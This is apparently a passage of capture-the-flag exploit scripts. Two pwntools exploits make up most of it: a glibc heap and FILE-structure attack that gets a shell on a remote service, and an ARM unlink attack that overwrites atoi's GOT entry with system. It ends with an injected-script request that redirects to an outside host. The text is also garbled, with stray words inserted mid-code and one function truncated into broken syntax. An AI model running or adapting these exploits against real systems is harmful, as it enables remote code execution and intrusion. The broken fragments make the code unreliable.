    cmd(size)
    cmd1(note)
def delete(index):
   cmd(4)
   cmd(index)
def show(index):
   cmd(2)
   cmd(index)
def edit(index,note):
    cmd(3)
    cmd(index)
    cmd1(note)
def change(note):
    cmd(5)
    p.sendlineafter(":\n",note)
#p=process("./pig")
p=remote("172.35.13.26",8888)
change(a1)
for i in range(8):
   add(0xf0,"\n"*5)
for i in range(8):
   delete(7-i)
change(a2)
add(0xf0,"\n"*5)
delete(0)
change(a3)
add(0xf0,"\n"*5)
change(a2)
add(0x440,"\n"*(0x430/0x30))
change(a1)
add(0x208,"\n"*(0x208/0x30))
change(a3)
add(0x430,"\n"*(0x430/0x30))
add(0x430,"\n"*(0x430/0x30))
add(0x430,"\n"*(0x430/0x30))
change(a1)
add(0x208,"\n"*(0x208/0x30))
change(a2)
delete(1)
add(0x450,"\n"*(0x450/0x30))
change(a3)
delete(3)
change(a1)
show(3)
p.recvuntil("The message is: ")
heap= u64(p.recv(6)+"\x00\x00")
print hex(heap)#0x5555555707e0
change(a2)
show(1)
p.recvuntil("The message is: ")
libc= u64(p.recv(6)+"\x00\x00")-0x7ffff7db2fe0+0x7ffff7bc7000
print hex(libc)
#gdb.attach(p)
edit(1,p64(libc-0x7ffff7bc7000+0x7ffff7db3628-0x20)*2+"\n"*(0x440/0x30-1))
change(a1)
add(0x410,"\n"*(0x410/0x30))
#gdb.attach(p)
change(a2)
edit(1,p64(heap-0x5555555702b0+0x00005555555706a0)*2+"\n"*(0x440/0x30-1))
change(a3)
delete(1)
add(0x430,("/bin/sh\x00"+p64(libc-0x7ffff7bc7000+0x7ffff7c1c410))*(0x430/0x30))
base=0
ptr=0x100
end=0
buf_base=heap-0x5555555702b0+0x555555570d10
buf_end=heap-0x5555555702b0+0x555555570d10+70
next=heap-0x5555555702b0+0x55555556feb0
fake_jmp=libc-0x7ffff7bc7000+0x7ffff7db4560
payload=p64(0)
payload+=p64(0)+p64(base)+p64(ptr)+p64(end)
hello arm
payload+=p64(buf_base)+p64(buf_end)+p64(0)*4+p64(next)+p64(1)+p64(0)*12+p64(fake_jmp)
p.sendlineafter(":\n",payload)
change(a1)
edit(1,p64(libc-0x7ffff7bc7000+0x7ffff7db5b28-8)+"\n"*5)
base=0
ptr=0x100
end=0
buf_base=heap-0x5555555702b0+0x555555570df0
buf_end=heap-0x5555555702b0+0x555555570df0+70
next=heap-0x5555555702b0+0x55555556feb0
fake_jmp=libc-0x7ffff7bc7000+0x7ffff7db4560
payload=p64(0)*3
payload+=p64(0)+p64(base)+p64(ptr)+p64(end)
payload+=p64(buf_base)+p64(buf_end)+p64(0)*4+p64(next)+p64(1)+p64(0)*12+p64(fake_jmp)
edit(0,payload[:0x10]+payload[0x30:0x40]+payload[0x60:0x70]+payload[0x90:0xa0]+payload[
0xc0:0xd0])
p.sendline("")
change(a2)
edit(0,payload[0x10:0x20]+payload[0x40:0x50]+payload[0x70:0x80]+payload[0xa0:0xb0]+payl
oad[0xd0:0xe0]+"\n")
change(a3)
edit(0,payload[0x20:0x30]+payload[0x50:0x60]+payload[0x80:0x90]+payload[0xb0:0xc0]+"\n"
*2)
#gdb.attach(p)
p.interactive()
from pwn import *
# s = process("qemu-arm -g 1234 -L . ./pwnarm",shell=True)
# s = process("qemu-arm -L . ./pwnarm",shell=True)
s = remote("172.35.13.17","10001")
def cmd(i):
    s.sendlineafter("choice:",str(i))
    sleep(0.2)
def show(idx):
    cmd(2)
    s.sendlineafter("index?",str(idx))
    sleep(0.2)
def free(idx):
    cmd(3)
    s.sendlineafter("index?",str(idx))
    sleep(0.2)
def edit(idx,size,buf):
    cmd(4)
    s.sendlineafter("index?",str(idx))
    sleep(0.2)
    s.sendlineafter("size:",str(size))
    sleep(0.2)
    s.sendafter("inputs:",buf)
    sleep(0.2)
raw_input(">")
cmd(1)
# raw_input(">")
s.sendline("b53efe319540434961065ca81c5887a80ea2")
sizes = []
def dq(s):
    a = s % 8
    b = s/8
    s = b*8
    if(a > 4):
        s += 8
    s += 8
    if(s  0x40 and i > 0 and sizes[i+1] > 0x40):
        us = i
        break
dngs2010
svg  xss
 Chrome DevTools  for  eventloop 
print(hex(us),hex(sizes[us]),hex(sizes[us+1]))
bss = 0x10000+us*12+4
fake = p32(0)+p32(sizes[us])+p32(bss-12)+p32(bss-8)
fake = fake.ljust(sizes[us],'\x00')
fake += p32(sizes[us])+p32(sizes[us+1]+8)
edit(us,sizes[us]+8+8+8,fake)
free(us+1)
atoi_got = 0x11634
free_got = 0x1163C
puts_plt = 0x85F8
payload = p32(0x10000)+p32(0x100) #us-1
payload += p32(1)+p32(atoi_got)+p32(0x100) #us
payload += p32(1)+p32(free_got)+p32(0x100) #us+1
payload += p32(1)+p32(atoi_got)+p32(0x100) #us+2
edit(us,100,payload)
edit(us+1,4,p32(puts_plt))
free(us+2)
context.arch = 'arm'
libc = ELF("./lib/libc.so.0")
atoi = u32(s.recv(4))
success(hex(atoi))
libc.address = atoi-libc.sym['atoi']
success(hex(libc.address))
system = libc.sym['system']
edit(us,4,p32(system))
cmd("sh;\x00")
s.interactive()
GET /img/88888888">
window.location='http:%2f%2f172.35.13.164:8000%2ffuck2.html';
<image%20fuck=".png